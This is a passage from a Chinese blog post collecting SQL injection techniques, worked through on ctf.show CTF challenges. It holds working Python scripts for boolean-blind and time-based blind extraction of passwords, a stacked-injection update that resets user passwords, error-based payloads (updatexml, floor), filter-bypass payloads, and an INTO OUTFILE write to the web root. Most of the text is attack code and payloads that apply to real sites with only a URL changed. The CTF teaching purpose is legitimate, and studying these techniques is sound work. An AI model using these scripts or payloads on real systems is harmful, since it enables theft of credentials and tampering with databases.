当前要猜解的字符位置（从1开始计数）</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            猜解出的字符，如果猜解失败返回&#x27;?&#x27;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        low, high = <span class="number">32</span>, <span class="number">126</span>  <span class="comment"># 设置ASCII码搜索范围</span></span><br><span class="line">        <span class="comment"># 32是空格，126是波浪号~，覆盖了所有可打印字符</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:  <span class="comment"># 当搜索范围有效时继续循环</span></span><br><span class="line">            <span class="comment"># 计算中间值（二分查找的关键）</span></span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 构造第一个payload：判断字符是否大于中间值</span></span><br><span class="line">            <span class="comment"># 例如：1&#x27; and ASCII(SUBSTR((SELECT password FROM users), 1, 1)) &gt; 100 --+</span></span><br><span class="line">            payload = <span class="string">f&quot;1&#x27; and ASCII(SUBSTR((<span class="subst">&#123;query&#125;</span>), <span class="subst">&#123;pos&#125;</span>, 1)) &gt; <span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 发送payload并检查页面返回结果</span></span><br><span class="line">            <span class="keyword">if</span> <span class="variable language_">self</span>.check(payload):</span><br><span class="line">                <span class="comment"># 如果条件为真（字符ASCII &gt; mid），说明字符在[mid+1, high]区间</span></span><br><span class="line">                low = mid + <span class="number">1</span>  <span class="comment"># 将下界提高到mid+1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 如果条件为假（字符ASCII &lt;= mid），说明字符在[low, mid]区间</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 构造第二个payload：判断字符是否等于中间值</span></span><br><span class="line">                payload = <span class="string">f&quot;1&#x27; and ASCII(SUBSTR((<span class="subst">&#123;query&#125;</span>), <span class="subst">&#123;pos&#125;</span>, 1)) = <span class="subst">&#123;mid&#125;</span> --+&quot;</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> <span class="variable language_">self</span>.check(payload):</span><br><span class="line">                    <span class="comment"># 如果等于中间值，说明找到了正确的字符</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="built_in">chr</span>(mid)  <span class="comment"># 将ASCII码转换为字符并返回</span></span><br><span class="line">                </span><br><span class="line">                <span class="comment"># 如果不等于中间值，说明字符在[low, mid-1]区间</span></span><br><span class="line">                high = mid - <span class="number">1</span>  <span class="comment"># 将上界降到mid-1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果循环结束还没找到，返回&#x27;?&#x27;表示猜解失败</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, payload</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        发送payload到目标服务器并判断页面返回结果</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            payload: 注入的SQL语句，例如 &quot;1&#x27; and 1=1 --+&quot;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            True: 页面包含真值特征（条件为真）</span></span><br><span class="line"><span class="string">            False: 页面不包含真值特征（条件为假）或请求失败</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 构造完整的URL</span></span><br><span class="line">            <span class="comment"># 例如：http://target.com/page.php?id=1&#x27; and 1=1 --+</span></span><br><span class="line">            full_url = <span class="string">f&quot;<span class="subst">&#123;self.url&#125;</span>?id=<span class="subst">&#123;payload&#125;</span>&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 发送GET请求，设置3秒超时防止卡死</span></span><br><span class="line">            r = requests.get(full_url, timeout=<span class="number">3</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 检查响应文本中是否包含真值特征字符串</span></span><br><span class="line">            <span class="comment"># 如果包含，说明我们的条件为真；否则为假</span></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>.true_indicator <span class="keyword">in</span> r.text</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># 如果请求超时或发生其他错误，返回False</span></span><br><span class="line">            <span class="comment"># 这样可以避免程序因为网络问题而崩溃</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self, query, max_length=<span class="number">50</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        主方法：获取完整的查询结果数据</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        参数:</span></span><br><span class="line"><span class="string">            query: SQL查询语句，例如 &quot;SELECT database()&quot;</span></span><br><span class="line"><span class="string">            max_length: 最大猜解长度，防止无限循环（默认50）</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        返回:</span></span><br><span class="line"><span class="string">            完整的查询结果字符串</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span>  <span class="comment"># 初始化结果字符串</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 循环猜解每一个位置的字符</span></span><br><span class="line">        <span class="comment"># pos从1开始，因为SQL中的SUBSTR函数位置从1开始计数</span></span><br><span class="line">        <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">            <span class="comment"># 调用二分搜索猜解当前位置的字符</span></span><br><span class="line">            char = <span class="variable language_">self</span>.binary_search(query, pos)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 如果返回&#x27;?&#x27;，说明可能已经超出了实际字符串长度</span></span><br><span class="line">            <span class="comment"># 或者猜解失败，此时停止循环</span></span><br><span class="line">            <span class="keyword">if</span> char == <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 将猜解出的字符添加到结果中</span></span><br><span class="line">            result += char</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 实时打印进度，\r表示覆盖当前行，实现动态显示效果</span></span><br><span class="line">            <span class="comment"># end=&quot;&quot; 表示不换行，使进度在同一行显示</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\r[+] 已猜解: <span class="subst">&#123;result&#125;</span>&quot;</span>, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 延时0.1秒，避免请求过快触发WAF（Web应用防火墙）</span></span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 返回完整的猜解结果</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用示例部分</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    当直接运行此脚本时执行的代码</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 设置目标URL</span></span><br><span class="line">    <span class="comment"># 注意：这里使用的是示例域名，实际使用时需要替换为真实目标</span></span><br><span class="line">    url = <span class="string">&quot;http://target.com/page.php&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 创建注入器实例</span></span><br><span class="line">    <span class="comment"># 需要知道页面在条件为真时的特征，比如 &quot;Welcome&quot;、&quot;Success&quot;等</span></span><br><span class="line">    injector = AdvancedBooleanBlind(url, <span class="string">&quot;true_string&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 执行注入攻击</span></span><br><span class="line">    <span class="comment"># 尝试获取users表中的第一个用户的密码</span></span><br><span class="line">    data = injector.get_data(<span class="string">&quot;SELECT password FROM users LIMIT 0,1&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 打印最终结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\n[+] 最终结果: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>



<p>以ctfshow web174为例子。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,&#x27;cluster&#x27;,&#x27;boom&#x27;) %23&quot;</span></span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://1a4ab30a-cae4-439b-bbde-dddb10c3e851.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>):</span><br><span class="line">    response = requests.get(url + payload.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="comment">#print(response.text)</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text <span class="keyword">or</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;cluster&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;boom&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">abs</span>(start-end) == <span class="number">1</span> <span class="keyword">or</span> start == end:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        point = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">            start = point</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = point</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    flag += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>结合返回数据时间进行的盲注，主要使用substr,if，sleep函数</p>
<p><strong>SUBSTR</strong> 函数用于从字符串中提取子字符串。</p>
<p>语法：SUBSTR(string, start_position, [length])</p>
<p><strong>if</strong>函数跟其他语言的if一样。有三个参数，第一个参数是条件，第二个是真返回的语句，第二个是假返回的语句。</p>
<p><strong>sleep</strong>延时函数，sleep(3)就是程序暂停三秒的意思。</p>
<p>以ctfshow web175为例子</p>
<p>检测方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(1=1,sleep(3),1)--+</span><br></pre></td></tr></table></figure>

<p>意思是如果1&#x3D;1，则sleep（3）延迟三秒，否则返回1</p>
<p>可以明显看到网站进行了延时。</p>
<p>因此可以采取时间盲注。</p>
<p>以下为常见的模板脚本脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ba76949e-7eb1-43c8-9627-e4bec656336d.challenge.ctf.show/api/v5.php?id=1&#x27; and &quot;</span></span><br><span class="line"> </span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        payload = <span class="string">f&#x27;1=if(ascii(substr((select password from ctfshow_user5 limit 24,1),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(2),0) -- -&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url + payload, timeout=<span class="number">0.5</span>)</span><br><span class="line">            tail = mid</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        result += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>



<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p> 在 MySQL、SQL Server、PostgreSQL 等数据库中，分号表示一条 SQL 语句的结束。当后端数据库访问接口（如 PHP 的 <em>mysqli_multi_query()</em>）支持一次执行多条语句时，攻击者可在原有语句后添加分号并拼接新的 SQL，从而突破原语句的限制。</p>
<p>以ctfshow web195为例子。用；终止上条查询语句，然后我们就可以用更新语句来修改表内内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;update`ctfshow_user`set`pass`=1</span><br></pre></td></tr></table></figure>
<p>密码输入<br>1<br>提交两次即可，第一次触发修改。</p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>报错注入的核心在于利用数据库的报错函数，例如 MySQL 提供的 <em>updatexml()</em> 函数。当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
<p>常见的函数：</p>
<p><strong>extractvalue 和 updatexml</strong></p>
<p>对应payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot; and (select updatexml(1,concat(0x23,(select database())),0x23))--+</span><br></pre></td></tr></table></figure>

<p><strong>floor</strong>（要求表足够大）</p>
<p>原理：触发主键重复冲突，重而通过报错得知主键</p>
<p>比如</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), concat((select database()), floor(rand(0)*2)) x from users group by x;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>concat((select database()), floor(rand(0)\*2))</code></strong>：将查询到的数据库名与 <code>0</code> 或 <code>1</code> 拼接，构造出一个新的字符串键，比如 <code>&quot;security1&quot;</code> 或 <code>&quot;security0&quot;</code>。</p>
</li>
<li><p>当上述的“主键重复”报错发生时，MySQL 会抛出如下错误：</p>
<ul>
<li><pre><code>ERROR 1062 (23000): Duplicate entry &#39;security1&#39; for key &#39;group_key&#39;
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 于是，原本应该在查询结果里显示的数据库名 **&quot;security&quot;**，因为报错，被直接带到了错误信息里。</span><br><span class="line"></span><br><span class="line">对应payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ul>
</li>
</ul>
<p>爆库<br>SELECT * FROM user_rule WHERE id &#x3D; 1 AND (SELECT 1 from<br>(SELECT count(*),concat(0x23,(SELECT schema_name from information_schema.schemata LIMIT 0,1),0x23,floor(rand(0)<em>2)) as x<br>from information_schema.<code>COLUMNS</code> GROUP BY x)<br>as y)<br>爆表<br>SELECT * FROM user_rule WHERE id &#x3D; 1 AND (SELECT 1 from<br>(SELECT count(</em>),concat(0x23,<br>(SELECT table_name from information_schema.<code>TABLES</code> WHERE table_schema &#x3D; database() LIMIT 0,1),<br>0x23,floor(rand(0)<em>2)) as x<br>from information_schema.<code>COLUMNS</code> GROUP BY x)<br>as y)<br>爆列<br>SELECT * FROM user_rule WHERE id &#x3D; 1 AND (SELECT 1 from<br>(SELECT count(</em>),concat(0x23,(SELECT column_name from information_schema.COLUMNS where table_name &#x3D; ‘members’ LIMIT 0,1),<br>0x23,floor(rand(0)*2)) as x<br>from information_schema.<code>COLUMNS</code> GROUP BY x)<br>as y)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">以ctfshow</span><br><span class="line"></span><br><span class="line"># 常见绕过</span><br><span class="line"></span><br><span class="line">### 进行编码</span><br><span class="line"></span><br><span class="line">当返回逻辑有检验的时候，可以对返回的内容进行编码，常见的有base64和hex，比如</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">1&#x27; union select 1,2,to_base64(password) from ctfshow_user3 where username=&#x27;flag&#x27;--+</span><br><span class="line">-1&#x27; union select 1,to_base64(username),hex(password) from ctfshow_user3 --+</span><br></pre></td></tr></table></figure>

<p>可以参考ctfshow web173</p>
<h3 id="进行替换"><a href="#进行替换" class="headerlink" title="进行替换"></a>进行替换</h3><p>当返回检测很严格的时候可以采取替换，即replace()函数，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,&#x27;1&#x27;,&#x27;A&#x27;),&#x27;2&#x27;,&#x27;B&#x27;),&#x27;3&#x27;,&#x27;C&#x27;),&#x27;4&#x27;,&#x27;D&#x27;),&#x27;5&#x27;,&#x27;E&#x27;),&#x27;6&#x27;,&#x27;F&#x27;),&#x27;7&#x27;,&#x27;G&#x27;),&#x27;8&#x27;,&#x27;H&#x27;),&#x27;9&#x27;,&#x27;I&#x27;),&#x27;0&#x27;,&#x27;J&#x27;),&#x27;a&#x27; from ctfshow_user4--+</span><br></pre></td></tr></table></figure>

<p>可以参考ctfshow174</p>
<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>适用于将关键词删除的绕过方法</p>
<p>比如UNIUNIONON删去UNION后就是UNION</p>
<h3 id="二次绕过"><a href="#二次绕过" class="headerlink" title="二次绕过"></a>二次绕过</h3><p>也就是第一次往数据库写入东西，第二次结合第一次的内容进行注入。</p>
<h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>用于有可写权限但是严格过滤的环境。</p>
<p>以ctfshow web175为例子</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,password from ctfshow_user5 into outfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span><span class="number">1.</span>txt<span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>

<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>sql语句是大小写不敏感的，因此可以使用大小写绕过。</p>
<p>以ctfshow web176为例子</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; Union Select 1,2,database()</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">Union</span> <span class="keyword">Select</span> <span class="number">1</span>,<span class="number">2</span>,password <span class="keyword">from</span> ctfshow_user <span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h3 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h3><p>过滤空格，使用&#x2F;**&#x2F;注释绕过，或者%09tab水平制表符, %0c也行</p>
<p>以ctfshow web181为例子</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;%0cunion%0cselect%0c1,2,password%0cfrom%0cctfshow_user--%0c</span></span><br></pre></td></tr></table></figure>



<h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>sqlmap是我们经常使用的自动化注入工具</p>
<p>以ctfshow213为例子</p>
</div></section><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="打赏" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><span class="icon iconify" data-icon="ri:hand-coin-line"></span></span><div id="reward-comment">I'm so cute. Please give me money.</div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>伊卡洛维奇</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/" title="sql注入整理">http://lunereal.1kal0vic.top/2026/02/21/sql%E6%B3%A8%E5%85%A5/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/12/17/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/" rel="next" title=""><span class="post-nav-text"></span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2026 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 伊卡洛维奇</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2024-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div><div class="footer-support"><span>本站由</span><a class="footer-support-logo" href="https://www.rainyun.com/YeMeng_" target="blank" title="雨云"><img height="30" src="https://cn-sy1.rains3.com/yemenghexo/rainyunlogo.png" alt="雨云"></a><span>提供 对象存储 服务</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>